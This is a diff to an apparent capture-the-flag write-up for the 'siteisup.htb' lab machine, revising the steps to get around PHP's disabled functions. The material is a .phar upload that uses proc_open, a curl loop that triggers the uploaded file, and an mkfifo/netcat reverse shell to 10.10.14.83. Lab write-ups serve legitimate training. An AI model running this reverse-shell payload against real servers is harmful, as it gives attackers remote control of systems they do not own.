@@ -317,7 +317,7 @@ Using that script prints alot and in the disable functions section we can see th
 
 ![image](https://user-images.githubusercontent.com/105310322/191994679-3a4bcb80-822b-4501-8443-718edd7e283e.png)
 
-The link below gives the script and all you have to do is put in your reverse shell.
+The link below gives the script and all you have to do is put in your reverse shell and change in the proc_open() section php to sh.
 
 https://www.php.net/manual/en/function.proc-open.php
 
@@ -329,11 +329,8 @@ Now we can take everything that checker.php is checking for and form our payload
 1. I Added lots of websites to look at so I would have more time to navigate to the file upload since it gets deleted very quickly. 
 2. Create it as a .phar file
 3. Use a proc_open script with your reverse shell.
-4. Make sure your burp suite is ready to go with ```Special-Dev: only4dev```
+4. Make sure your burp suite is ready to go with ```Special-Dev: only4dev``` (In burpsuite community you will have to input this every time you load a page)
 5. Alternatively you can run this Curl command from another user ```curl -H 'Special-Dev: only4dev' -s http://dev.siteisup.htb/uploads/ | grep "\[DIR\]" | cut -d "\"" -f 8 > folder-names; while read -r line; do curl -v -H 'Special-Dev: only4dev' "http://dev.siteisup.htb/uploads/${line}<PHAR-FILE-NAME>.phar"; done < folder-names``` and it should work but I have not tested.
-
-
-
 
 
 
@@ -367,13 +364,19 @@ http://siteisdown.htb
 http://siteisdown.htb
 
 
+
 <?php
 $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
 );
-$process = proc_open("sh", $descriptorspec, $pipes);
+
+$cwd = '/tmp';
+$env = array('some_option' => 'aeiou');
+
+$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
+
 if (is_resource($process)) {
     // $pipes now looks like this:
     // 0 => writeable handle connected to child stdin
@@ -383,10 +386,9 @@ if (is_resource($process)) {
     fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.83 1234 >/tmp/f");
     fclose($pipes[0]);
 
-    while (!feof($pipes[1])) {
-        echo fgets($pipes[1], 1024);
-    }
+    echo stream_get_contents($pipes[1]);
     fclose($pipes[1]);
+
     // It is important that you close any pipes before calling
     // proc_close in order to avoid a deadlock
     $return_value = proc_close($process);
@@ -395,7 +397,7 @@ if (is_resource($process)) {
 }
 ?>
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.83 1234 >/tmp/f
+
 ```console
 └──╼ [★]$ nc -lvnp 1234
 Ncat: Version 7.92 ( https://nmap.org/ncat )
